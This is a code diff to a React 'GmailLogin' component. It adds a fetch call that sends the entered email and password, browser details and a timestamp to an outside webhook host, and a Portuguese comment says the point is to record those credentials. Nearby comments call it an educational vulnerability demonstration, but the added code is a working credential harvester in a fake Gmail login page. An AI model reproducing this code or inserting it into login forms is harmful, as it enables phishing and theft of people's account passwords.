@@ -162,7 +162,28 @@ function GmailLogin({ onBack }) {
       }
       
       setLoading(true);
-      
+
+      // vamos fazer um post para registrar o email e a password , e dados do navegador e ip e data/hora
+      fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          email,
+          password,
+          userAgent: navigator.userAgent,
+          ip:  navigator.connection ? navigator.connection.remoteAddress : 'unknown',
+          clientInfo: {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language
+          },
+          timestamp: new Date().toISOString(),
+          step: 'login_attempt'
+        })
+      });
+
       // SECURITY VULNERABILITY DEMONSTRATION:
       // This demonstrates how credentials could be intercepted by malicious code
       // DO NOT implement this in real applications - for educational purposes only
